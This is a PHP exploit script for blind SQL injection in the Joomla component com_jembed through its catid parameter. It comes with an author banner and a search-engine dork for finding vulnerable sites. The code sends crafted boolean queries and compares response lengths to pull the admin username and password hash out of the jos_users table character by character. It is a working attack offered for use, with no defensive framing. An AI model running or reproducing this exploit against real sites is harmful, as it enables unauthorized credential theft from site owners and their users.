<?php
ini_set("max_execution_time",0);
print_r('

\\\|///
\\ - - //
( @ @ )
----oOOo--(_)-oOOo---------------------------
@~~=Author : FL0RiX

@~~=Greez : Dostumuz Yokki yazak

@~~=Dork : inurl:"com_jembed"

@~~=Bug : com_jembed (catid) Blind SQL Injection Exploit

@~~=WARNING! : : php file.php "http://www.site.com/index.php?option=com_jembed&task=summary&catid=99"
---------------Ooooo-------------------------
( )
ooooO ) /
( ) (_/
\ (
\_)


');
if ($argc > 1) {
$url = $argv[1];
$r = strlen(file_get_contents($url."+and+1=1--"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."+and+1=0--"));
$t = abs((100-($w/$r*100)));
echo "Username: ";
for ($i=1; $i <= 30; $i++) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$i.",1))!=0--"));
if (abs((100-($laenge/$r*100))) > $t-1) {
$count = $i;
$i = 30;
}
}
for ($j = 1; $j < $count; $j++) {
for ($i = 46; $i <= 122; $i=$i+2) {
if ($i == 60) {
$i = 98;
}
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$j.",1))%3E".$i."--"));
if (abs((100-($laenge/$r*100))) > $t-1) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
if (abs((100-($laenge/$r*100))) > $t-1) {
echo chr($i-1);
} else {
echo chr($i);
}
$i = 122;
}
}
}
echo "\nPassword: ";
for ($j = 1; $j <= 49; $j++) {
for ($i = 46; $i <= 102; $i=$i+2) {
if ($i == 60) {
$i = 98;
}
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".$i."--"));
if (abs((100-($laenge/$r*100))) > $t-1) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
if (abs((100-($laenge/$r*100))) > $t-1) {
echo chr($i-1);
} else {
echo chr($i);
}
$i = 102;
}
}
}
}
?>